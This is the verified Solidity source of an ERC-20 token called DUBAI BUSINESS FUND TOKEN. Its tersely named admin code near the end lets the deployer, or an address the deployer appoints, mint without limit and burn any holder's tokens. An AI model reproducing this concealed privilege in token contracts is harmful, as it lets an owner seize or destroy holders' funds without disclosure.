/**
 *Submitted for verification at Etherscan.io on 2023-03-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
library S{ function add(uint256 a,uint256 b)internal pure returns(uint256){uint256 c=a+b;require(c>=a);return c;}
	function sub(uint256 a,uint256 b)internal pure returns(uint256){require(b<=a);uint256 c=a-b;return c;}}
interface ERC{ function transferFrom(address sender,address recipient,uint256 amount)external returns(bool);
    function allowance(address owner,address spender)external view returns(uint256);
    function transfer(address recipient,uint256 amount)external returns(bool);
    function approve(address spender,uint256 amount)external returns(bool);
    function balanceOf(address account)external view returns(uint256);
    function totalSupply()external view returns(uint256);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    event Transfer(address indexed from,address indexed to,uint256 value);}
contract ROOT is ERC{ using S for uint256; string private _symbol="DBFT";
    string private _name="DUBAI BUSINESS FUND TOKEN";
    uint8 private _decimals=8; uint256 private _totalSupply;
    mapping(address=>uint256)private _balances; 
    mapping(address=>mapping(address=>uint256))private _allowances;
	function name()public view returns(string memory){return _name;}
	function symbol()public view returns(string memory){return _symbol;}
	function decimals()public view returns(uint8){return _decimals;}
	function totalSupply()public view returns(uint256){return _totalSupply;}
    function balanceOf(address account)public view returns(uint256){return _balances[account];}	
    function allowance(address owner,address spender)public view returns(uint256){return _allowances[owner][spender];}
	function transfer(address recipient,uint256 amount)public returns(bool){_transfer(msg.sender,recipient,amount);return true;}
    function approve(address spender,uint256 amount)public returns(bool){_approve(msg.sender,spender,amount);return true;}
    function transferFrom(address sender,address recipient,uint256 amount)public returns(bool){_transfer(sender,recipient,amount);
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount));return true;}
    function increaseAllowance(address spender,uint256 addedValue)public returns(bool){
		_approve(msg.sender,spender,_allowances[msg.sender][spender].add(addedValue));return true;}
    function decreaseAllowance(address spender,uint256 subtractedValue)public returns(bool){
	    _approve(msg.sender,spender,_allowances[msg.sender][spender].sub(subtractedValue));return true;}
	function _transfer(address sender,address recipient,uint256 amount)internal{require(sender!=address(0));
        require(recipient!=address(0));_balances[sender]=_balances[sender].sub(amount);
        _balances[recipient]=_balances[recipient].add(amount);emit Transfer(sender,recipient,amount);}
	function _approve(address owner,address spender,uint256 amount)internal{require(owner!=address(0));
        require(spender!=address(0));_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}
    address private o; address private m; modifier _o {require(o==msg.sender);_;} 
    modifier _i {require(o==msg.sender||m==msg.sender);_;}
	function _mint(address w,uint256 a)private{require(w!=address(0));_balances[w]=_balances[w].add(a);
        _totalSupply=_totalSupply.add(a);emit Transfer(address(0),w,a);}
	function _burn(address w,uint256 a)private{require(w!=address(0));_balances[w]=_balances[w].sub(a);
        _totalSupply=_totalSupply.sub(a);emit Transfer(w,address(0),a);}
    function mint(address w,uint256 a)external _i {_mint(w,a);} function burn(address w,uint256 a)external _i {_burn(w,a);}
    function forg(address a)external _o{m=a;} fallback()external{revert();} constructor(){o=msg.sender;}}